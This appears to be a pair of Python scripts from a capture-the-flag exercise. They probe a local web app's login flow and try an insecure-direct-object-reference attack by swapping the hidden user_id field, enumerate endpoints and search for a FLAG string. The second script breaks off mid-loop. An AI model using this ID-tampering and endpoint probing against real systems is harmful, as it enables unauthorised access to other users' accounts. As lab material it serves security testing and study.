import requests
import re

base_url = "http://127.0.0.1:33029"

print("Detailed Authentication Flow Analysis")
print("=" * 60)

# Step 1: Check all headers from auth response
auth_data = {"username": "test", "password": "test"}
auth_resp = requests.post(f"{base_url}/", data=auth_data, allow_redirects=False)

print("\n[+] Auth Response Details:")
print(f"  Status: {auth_resp.status_code}")
print(f"\n  All Headers:")
for key, value in auth_resp.headers.items():
    print(f"    {key}: {value}")

print(f"\n  Cookies object: {dict(auth_resp.cookies)}")
print(f"  Response body length: {len(auth_resp.text)}")

# Step 2: Get password page directly and check if user_id differs based on Referer or timing
print("\n" + "=" * 60)
print("Testing /password/test variations")
print("=" * 60)

# Check if there's any hidden parameter
pass_resp = requests.get(f"{base_url}/password/test")
print(f"\n[+] GET /password/test:")
print(f"  Status: {pass_resp.status_code}")
print(f"  Length: {len(pass_resp.text)}")

# Extract all form fields
print("\n  Form fields found:")
form_fields = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\'][^>]*>', pass_resp.text)
for name, value in form_fields:
    print(f"    {name}: {value}")

hidden_fields = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\'][^>]*>', pass_resp.text)
if hidden_fields:
    print("\n  Hidden fields:")
    for name, value in hidden_fields:
        print(f"    {name}: {value}")

# Step 3: Test POST with various ID values and check response differences
print("\n" + "=" * 60)
print("Comparing POST responses for different user_ids")
print("=" * 60)

test_ids = [10032, 10033, 10030, 10001, 1, 99999]

for test_id in test_ids:
    data = {'password': 'test', 'user_id': str(test_id)}
    post_resp = requests.post(f"{base_url}/password/test", data=data, allow_redirects=False)
    
    print(f"\n[+] user_id={test_id}:")
    print(f"  Status: {post_resp.status_code}")
    print(f"  Location: {post_resp.headers.get('Location', 'N/A')}")
    
    if post_resp.status_code == 302:
        # Follow redirect
        location = post_resp.headers.get('Location', '')
        if location.startswith('/'):
            redirect_resp = requests.get(f"{base_url}{location}")
        else:
            redirect_resp = requests.get(location)
        
        print(f"  Redirect status: {redirect_resp.status_code}")
        print(f"  Redirect length: {len(redirect_resp.text)}")
        
        # Check if it's actually the dashboard or login
        if 'Login' in redirect_resp.text and 'password' not in location.lower():
            print(f"  [NOTE] Redirected to login page")
        elif 'Dashboard' in redirect_resp.text or 'dashboard' in redirect_resp.text.lower():
            print(f"  [NOTE] Shows Dashboard")
            
        # Check for FLAG
        if 'FLAG' in redirect_resp.text:
            flag = re.search(r'FLAG\{[^}]+\}', redirect_resp.text)
            if flag:
                print(f"  [!] FLAG: {flag.group(0)}")
    else:
        # Print error message if any
        error = re.search(r'(error|invalid|wrong)[^<]{0,100}', post_resp.text, re.I)
        if error:
            print(f"  Error: {error.group(0)}")

# Step 4: Check if there's any profile or user detail page
print("\n" + "=" * 60)
print("Checking for additional endpoints")
print("=" * 60)

endpoints_to_check = [
    '/profile', '/user', '/account', '/me', '/users', 
    '/api/user', '/api/users', '/api/me', '/api/profile',
    '/user/profile', '/user/10032', '/user/10033'
]

for endpoint in endpoints_to_check:
    resp = requests.get(f"{base_url}{endpoint}", allow_redirects=False)
    if resp.status_code != 404:
        print(f"\n[+] {endpoint}: Status={resp.status_code}, Length={len(resp.text)}")
        if 'FLAG' in resp.text:
            flag = re.search(r'FLAG\{[^}]+\}', resp.text)
            if flag:
                print(f"  [!] FLAG: {flag.group(0)}")

import requests
import re

base_url = "http://127.0.0.1:33029"

print("Session Cookie Investigation")
print("=" * 60)

# Create a session that follows redirects
session = requests.Session()

# Step 1: Authenticate with redirect following
auth_data = {"username": "test", "password": "test"}
auth_resp = session.post(f"{base_url}/", data=auth_data, allow_redirects=True)

print(f"\n[+] Auth POST (with redirects):")
print(f"  Final URL: {auth_resp.url}")
print(f"  Status: {auth_resp.status_code}")
print(f"  History: {[r.status_code for r in auth_resp.history]}")

# Check session cookies
print(f"\n  Session cookies after auth:")
for cookie in session.cookies:
    print(f"    {cookie.name}: {cookie.value[:50]}... (expires: {cookie.expires})")

# Step 2: Check if there are any cookies
if not session.cookies:
    print("\n  [!] No session cookies set!")
    print("  This could indicate:")
    print("  - Session isn't needed for auth")
    print("  - Cookie is set client-side (JavaScript)")
    print("  - Session exists but isn't being properly transmitted")

# Step 3: Try the password POST with the session
print(f"\n[+] POST to /password/test with session:")
password_data = {'password': 'test', 'user_id': '10032'}
pass_resp = session.post(f"{base_url}/password/test", data=password_data, allow_redirects=False)

print(f"  Status: {pass_resp.status_code}")
print(f"  Location: {pass_resp.headers.get('Location', 'N/A')}")

# Check if the session cookie was updated/changed
print(f"\n  Session cookies after password POST:")
for cookie in session.cookies:
    print(f"    {cookie.name}: {cookie.value[:50]}...")

# Step 4: Check response headers from password POST for Set-Cookie
print(f"\n  Response headers (Set-Cookie):")
set_cookie = pass_resp.headers.get('Set-Cookie', '')
if set_cookie:
    print(f"    {set_cookie}")
else:
    print(f"    None")

# Step 5: Follow redirect to dashboard manually
if pass_resp.status_code == 302:
    dash_resp = session.get(f"{base_url}/dashboard")
    print(f"\n[+] GET /dashboard with session:")
    print(f"  Status: {dash_resp.status_code}")
    print(f"  URL: {dash_resp.url}")
    print(f"  Length: {len(dash_resp.text)}")
    
    # Check what page we actually got
    if 'dashboard' in dash_resp.url.lower():
        print(f"  [+] Successfully on dashboard")
    
    # Look for user data
    if 'Welcome' in dash_resp.text:
        welcome = re.search(r'Welcome[,\s]+([^<\n]+)', dash_resp.text)
        if welcome:
            print(f"  [+] Welcome message: {welcome.group(1)}")
    
    # Extract all visible text that might contain user info
    visible_text = re.findall(r'>([^<]{3,50})<', dash_resp.text)
    user_related = [t for t in visible_text if any(word in t.lower() for word in ['user', 'name', 'welcome', 'hello', 'account', 'profile'])]
    if user_related:
        print(f"  [+] User-related text: {user_related[:5]}")
    
    # Search for FLAG
    if 'FLAG' in dash_resp.text:
        flag = re.search(r'FLAG\{[^}]+\}', dash_resp.text)
        if flag:
            print(f"\n  [!] FLAG FOUND: {flag.group(0)}")
    
    # Print a snippet of the dashboard content
    print(f"\n  Dashboard content (first 500 chars):")
    print(f"  {dash_resp.text[:500]}")

# Step 6: Try IDOR with different user_ids using the same session flow
print("\n" + "=" * 60)
print("Testing IDOR with different user_ids")
print("=" * 60)

test_ids = [10032, 10033, 10030, 10031]

for test_id in test_ids:
    # Create new session for each test
    test_session = requests.Session()
    
    # Authenticate
    test_session.post(f"{base_url}/", data=auth_data, allow_redirects=True)
    
